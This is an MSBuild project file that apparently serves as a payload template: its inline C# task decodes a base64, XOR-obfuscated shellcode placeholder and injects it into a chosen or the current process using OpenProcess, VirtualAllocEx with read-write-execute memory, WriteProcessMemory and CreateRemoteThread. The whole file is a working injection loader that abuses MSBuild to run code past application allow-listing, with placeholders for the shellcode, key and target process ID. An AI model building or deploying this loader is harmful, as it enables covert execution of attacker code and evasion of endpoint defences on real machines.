<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="s">
   <s />
  </Target>
  <UsingTask
    TaskName="s"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
  <Task>
  <Using Namespace="System" />
  <Using Namespace="System.Diagnostics" />
  <Using Namespace="System.Reflection" />
  <Using Namespace="System.Runtime.InteropServices" />
  <Code Type="Class" Language="cs">
      <![CDATA[
using System;
using System.Text;
using System.Reflection;
using Microsoft.CSharp;
using Microsoft.Build.Framework;
using Microsoft.Build.Utilities;
using System.Diagnostics;
using System.Runtime.InteropServices;

public class s : Task, ITask
{
	public override bool Execute()
	{
		Program.Main();
		return true;
	}
}

public class Program
{
	public enum ProcessAccessRights
	{
		All = 0x001F0FFF,
		Terminate = 0x00000001,
		CreateThread = 0x00000002,
		VirtualMemoryOperation = 0x00000008,
		VirtualMemoryRead = 0x00000010,
		VirtualMemoryWrite = 0x00000020,
		DuplicateHandle = 0x00000040,
		CreateProcess = 0x000000080,
		SetQuota = 0x00000100,
		SetInformation = 0x00000200,
		QueryInformation = 0x00000400,
		QueryLimitedInformation = 0x00001000,
		Synchronize = 0x00100000
	}
	public enum MemAllocation
	{
		MEM_COMMIT = 0x00001000,
		MEM_RESERVE = 0x00002000,
		MEM_RESET = 0x00080000,
		MEM_RESET_UNDO = 0x1000000,
		SecCommit = 0x08000000
	}
	public enum MemProtect
	{
		PAGE_EXECUTE = 0x10,
		PAGE_EXECUTE_READ = 0x20,
		PAGE_EXECUTE_READWRITE = 0x40,
		PAGE_EXECUTE_WRITECOPY = 0x80,
		PAGE_NOACCESS = 0x01,
		PAGE_READONLY = 0x02,
		PAGE_READWRITE = 0x04,
		PAGE_WRITECOPY = 0x08,
		PAGE_TARGETS_INVALID = 0x40000000,
		PAGE_TARGETS_NO_UPDATE = 0x40000000,
	}

	[DllImport("Kernel32", SetLastError = true)]
	static extern IntPtr OpenProcess(uint dwDesiredAccess, bool bInheritHandle, uint dwProcessId);
	[DllImport("Kernel32", SetLastError = true)]
	static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
	[DllImport("Kernel32", SetLastError = true)]
	static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, [MarshalAs(UnmanagedType.AsAny)] object lpBuffer, uint nSize, ref uint lpNumberOfBytesWritten);
	[DllImport("Kernel32", SetLastError = true)]
	static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, ref uint lpThreadId);
	[DllImport("Kernel32", SetLastError = true)]
	static extern bool CloseHandle(IntPtr hObject);
	[DllImport("Kernel32", SetLastError = true)]
	static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

	public static void Main()
	{
		string data = "~~SHELLCODE~~";
		string key = "~~KEY~~";
		byte[] buf = Zor(Convert.FromBase64String(data), Encoding.UTF8.GetBytes(key));
		int pid = ~~PID~~;
		bool pause = false;
		if (pid == 0) // local
		{
			pid = Process.GetCurrentProcess().Id;
			pause = true;
		}

		try
		{
			uint lpNumberOfBytesWritten = 0;
			uint lpThreadId = 0;
			Console.WriteLine("[*] Obtaining the handle for the process id " + pid);
			IntPtr pHandle = OpenProcess((uint)ProcessAccessRights.All, false, (uint)pid);
			Console.WriteLine("[*] Handle {pHandle} opened for the process id " + pid);
			Console.WriteLine("[*] Allocating memory to inject the shellcode");
			IntPtr rMemAddress = VirtualAllocEx(pHandle, IntPtr.Zero, (uint)buf.Length, (uint)MemAllocation.MEM_RESERVE | (uint)MemAllocation.MEM_COMMIT, (uint)MemProtect.PAGE_EXECUTE_READWRITE);
			Console.WriteLine("[*] Memory for injecting shellcode allocated at 0x" + rMemAddress);
			Console.WriteLine("[*] Writing the shellcode at the allocated memory location");
			IntPtr hRemoteThread = IntPtr.Zero;
			if (WriteProcessMemory(pHandle, rMemAddress, buf, (uint)buf.Length, ref lpNumberOfBytesWritten))
			{
				Console.WriteLine("[*] Shellcode written in the process memory");
				Console.WriteLine("[*] Creating remote thread to execute the shellcode");
				hRemoteThread = CreateRemoteThread(pHandle, IntPtr.Zero, 0, rMemAddress, IntPtr.Zero, 0, ref lpThreadId);

				if(pause)
				{
					Console.WriteLine("[*] Waiting for thread to exit before shutting down current process");
					WaitForSingleObject(hRemoteThread, 0xFFFFFFFF);
				}

				bool hCreateRemoteThreadClose = CloseHandle(hRemoteThread);
				Console.WriteLine("[+] Sucessfully injected the shellcode into the memory of the process id " + pid);
			}
			else
			{
				Console.WriteLine("[-] Failed to write the shellcode into the memory of the process id " + pid);
			}
			bool hOpenProcessClose = CloseHandle(pHandle);

		}
		catch (Exception ex)
		{
			Console.WriteLine("[-] " + Marshal.GetExceptionCode());
			Console.WriteLine(ex.Message);
		}
		Console.WriteLine("[*] Finished!");
	}
	
	private static byte[] Zor(byte[] input, byte[] key)
	{
		byte[] mixed = new byte[input.Length];
		for (int i = 0; i < input.Length; i++)
		{
			mixed[i] = (byte)(input[i] ^ key[i % key.Length]);
		}
		return mixed;
	}

}
        ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>

